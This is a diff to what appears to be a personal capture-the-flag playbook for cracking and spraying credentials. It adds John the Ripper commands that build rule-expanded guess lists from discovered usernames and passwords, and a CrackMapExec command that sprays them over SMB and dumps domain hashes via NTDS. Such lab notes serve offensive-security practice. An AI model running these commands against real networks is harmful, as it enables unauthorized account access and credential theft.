@@ -14,15 +14,23 @@ The tools in the workflow:
 The workflow has a repeated 'core':
 1. take 'output' (usernames, clear passwords, wordlists)
 2. rules them
-3. append to ongoing wordlist
+3. append to ongoing guesses list
 
 In each workflow task there is a) 'use ongoing wordlist' and b) 'feed outputs into the core.'
 
 # Core
 
-TODO take all words, usernames and passwords, concat and best64 them. save as `guesses.txt`
+If there are no users discovered and no passwords discovered, use rockyou ;)
 
-? If there are no users discovered, copy `guesses.txt` to `users.txt` ?
+Else take all words, usernames and passwords, best64 and passphrase-2 them (for `!` stuff). save as `guesses.txt`
+
+```sh
+cat users.txt passwords.txt wordlist.txt > input.txt
+john --wordlist=input.txt -ru:passphrase-rule2 --stdout > guesses.txt
+john --wordlist=input.txt -ru:best64 --stdout >> guesses.txt
+```
+
+If there are no users discovered, copy `guesses.txt` to `users.txt`
 
 # CeWL -- Add to the Wordlist
 
@@ -33,7 +41,7 @@ TODO take all words, usernames and passwords, concat and best64 them. save as `g
 `crackmapexec smb -d DOMAIN -u ${ctf}/users.txt -p ${ctf}/guesses.txt --ntds drsuapi 10.1.0.100`
 
 `--sam` instead for listing local accounts
-`==shares` instead for listing shares
+`--shares` instead for listing shares
 
 # CrackMapExec -- use hashes
 
